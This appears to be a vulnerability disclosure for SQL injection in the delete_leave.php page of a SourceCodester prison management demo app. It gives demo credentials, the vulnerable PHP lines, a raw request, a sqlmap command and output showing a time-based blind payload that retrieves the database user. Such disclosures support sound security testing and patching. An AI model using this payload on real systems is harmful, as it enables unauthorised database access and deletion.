Prison Management System - SQL Injection on (/Employee/delete_leave.php) 

Vendor Homepage:

```
https://www.sourcecodester.com/sql/17287/prison-management-system.html
```

Version: 

```
V1.0
```

Tested on: 

```
PHP, Apache, MySQL
```

Crudentials:

```
http://url:8888/Account/login.php
releaseme@gmail.com
escobar2012
```

Affected Page:

```
/Employee/delete_leave.php
```

In this scenario, user input (id) is directly  incorporated into an SQL query without any filtering or prepared  statements, making the application susceptible to SQL Injection attacks.

```
11: mysqli_query $result = mysqli_query($conn, $sql); 
10: $sql = "DELETE From `tblleave` where leaveID ='$id'"; 
9: $id = $_GET['id']; 
```

Proof of vulnerability:

Request:

```
GET /prison/Employee/delete_leave.php?id=2023399* HTTP/1.1
Host: localhost:8888
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/jxl,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Sec-GPC: 1
Connection: close
Referer: http://localhost:8888/prison/Employee/leave_history.php
Cookie: PHPSESSID=n3ilei2mg7mov24l4ol9itjc14
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
```

```
python3 sqlmap.py -r 1.txt --current-user --batch --dbms mysql
```

```
[12:13:52] [INFO] checking if the injection point on URI parameter '#1*' is a false positive
URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 3237 HTTP(s) requests:
---
Parameter: #1* (URI)
    Type: time-based blind
    Title: MySQL < 5.0.12 AND time-based blind (BENCHMARK)
    Payload: http://localhost:8888/prison/Employee/delete_leave.php?id=2023399' AND 6617=BENCHMARK(5000000,MD5(0x71456963))-- LMzp
---
[12:14:07] [INFO] the back-end DBMS is MySQL
[12:14:07] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
web application technology: PHP 7.4.33, Apache 2.4.54
back-end DBMS: MySQL < 5.0.12
[12:14:08] [INFO] fetching current user
[12:14:08] [INFO] retrieved:
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
root@localhost
current user: 'root@localhost'
```

